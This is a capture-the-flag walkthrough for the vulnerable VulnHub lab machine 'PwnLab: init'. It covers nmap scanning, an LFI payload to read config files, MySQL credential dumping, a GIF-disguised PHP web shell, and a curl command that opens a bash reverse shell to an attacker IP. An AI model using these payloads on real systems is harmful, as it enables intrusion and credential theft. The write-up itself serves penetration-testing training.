::::::::::::::::::::: page
# PwnLab: init {#pwnlab-init .title}

\

## 

## PwnLab: init

- **[PwnLab: init]{style="color:#237522;"}** :-

<!-- -->

- Download the machine :
  <https://www.vulnhub.com/entry/pwnlab-init,158/>

![](844-1.png)

- Open ova file .
- Then click finish .
- Start the machine .

1.  [Network Scanning]{style="color:#9141ac;"} :

- Find the machine IP :

::: codebox
    nmap -sn 192.168.2.0/24
:::

![](844-2.png)

- Run nmap master command :

::: codebox
    nmap -v -Pn -sT -sV -sC -A -O -p- 192.168.2.222
:::

![](844-3.png)

- Find available port in the machine ( Optional ) :

::: codebox
    nmap -v -p- 192.168.2.222
:::

- 

::: codebox
    nmap -sC -sV -A 192.168.2.222  
:::

- This command runs an aggressive scan and uses the http-enum script to
  identify potential CGI directories .

::: codebox
    nmap -v -p 80 -sT -sV -A --script=http-enum.nse 192.168.2.222
:::

![](844-4.png)

1.  [Web Enumeration]{style="color:#9141ac;"} :

- IP visit in browser : <http://192.168.2.222>
  <http://192.168.2.222/login.php> <http://192.168.2.222/images/>

<!-- -->

- Click on login then open login page :
  <http://192.168.2.222/?page=login>

![](844-5.png) This is LFI in this website .

- Capture the request in burp suite :

![](844-6.png) Packet send to repeater .

- Inject the payload :

::: codebox
    ?page=php://filter/convert.base64-encode/resource=config
:::

![](844-7.png)

- Decode the base64 value :

::: codebox
    echo 'PD9waHANCiRzZXJ2ZXIJICA9ICJsb2NhbGhvc3QiOw0KJHVzZXJuYW1lID0gInJvb3QiOw0KJHBhc3N3b3JkID0gIkg0dSVRSl9IOTkiOw0KJGRhdGFiYXNlID0gIlVzZXJzIjsNCj8+' | base64 -d
:::

![](844-8.png)

- Found mysql username and password :

::: codebox
    <?php
    $server     = "localhost";
    $username = "root";
    $password = "H4u%QJ_H99";
    $database = "Users";
    ?>  
:::

1.  [MySQL Enumeration]{style="color:#9141ac;"} :

- MySQL login :

::: codebox
    mysql --skip-ssl -h 192.168.2.222 Users -u root -pH4u%QJ_H99
:::

![](844-9.png)

- Check list of users :

::: codebox
    select * from users;
:::

![](844-10.png)

- Decode the password value :

::: codebox
    echo 'Sld6WHVCSkpOeQ==' | base64 -d
:::

- 

::: codebox
    echo 'U0lmZHNURW42SQ==' | base64 -d
:::

- 

::: codebox
    echo 'aVN2NVltMkdSbw==' | base64 -d
:::

![](844-11.png)

- Found username and password :

::: codebox
    kent : JWzXuBJJNy
    mike : SIfdsTEn6I
    kane : iSv5Ym2GRo
:::

- Login the page : <http://192.168.2.222/?page=login>

![](844-12.png)

- After login open the upload page : <http://192.168.2.222/?page=upload>

![](844-13.png)

1.  [Reverse shell]{style="color:#9141ac;"} :

- Make a file :

::: codebox
    nano  shell.php.gif
:::

- Enter the payload :

::: codebox
    GIF89a;
    <?php system($_GET['cmd']); ?>
:::

- Upload the file :

![](844-14.png)

- After upload the file then visit the /upload endpoint :

![](844-15.png)

- Start the listener :

::: codebox
    nc -lvnp 443
:::

- Triggered reverse shell via curl :

::: codebox
    curl -b "lang=../upload/a131d09d22d1ec4f204e952068447736.gif" "http://192.168.2.222/?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/192.168.2.219/443+0>%261'"
:::

![](844-16.png)

- We got the shell :

![](844-17.png)
:::::::::::::::::::::
